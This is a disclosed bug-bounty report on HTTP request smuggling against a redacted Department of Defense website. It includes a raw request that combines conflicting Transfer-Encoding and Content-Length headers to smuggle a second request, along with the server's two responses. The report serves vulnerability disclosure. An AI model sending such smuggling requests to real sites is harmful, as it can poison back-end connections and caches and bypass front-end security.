# HTTP Request Smuggling 

## Report Details
- **Report ID**: 1120982
- **URL**: https://hackerone.com/reports/1120982
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-03-09T03:24:12.249Z
- **Disclosed**: 2021-04-20T19:36:48.644Z

## Reporter
- **Username**: lu3ky-13
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
hello dear support 
I have found HTTP Request Smuggling on www.████████

Issue description
==============

HTTP request smuggling vulnerabilities arise when websites route HTTP requests through webservers with inconsistent HTTP parsing.
By supplying a request that gets interpreted as being different lengths by different servers, an attacker can poison the back-end TCP/TLS socket and prepend arbitrary data to the next request. Depending on the website's functionality, this can be used to bypass front-end security rules, access internal systems, poison web caches, and launch assorted attacks on users who are actively browsing the site.

## Impact

Impact
an attacker can poison the TCP / TLS socket and add arbitrary data to the next request. Depending on the functionality of the website, this can be used to bypass front-end security rules, internal system access, poison the web cache, and launch various attacks on users who actively activate the site.

Reference: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

## System Host(s)
www.█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
http request
============
```
GET /404 HTTP/1.1
Host: www.███████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
███████
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 118
Connection: keep-alive

0

GET https://www.███████/███ HTTP/1.1
Host: www.█████████
foo: x
```

http response 
===============
```
HTTP/1.1 302 Found
Date: Tue, 09 Mar 2021 02:54:22 GMT
Server: Apache
Set-Cookie: ███=expiry=1615259062417257;Max-Age=600;path=/;httponly;secure;
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin
Location: https://www.████/404_not_found.html
Content-Length: 236
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="https://www.████████/404_not_found.html">here</a>.</p>
</body></html>
HTTP/1.1 200 OK
Date: Tue, 09 Mar 2021 02:54:22 GMT
Server: Apache
Set-Cookie: ████████=expiry=1615259062417962;Max-Age=600;path=/;httponly;secure;
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin
Cache-Control: no-cache, private
Last-Modified: Mon, 05 Mar 2012 16:45:37 GMT
ETag: "78d0-4ba81a7e20e40"
Accept-Ranges: bytes
Content-Length: 30928
Content-Type: image/png

PNG


```

██████
██████████

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
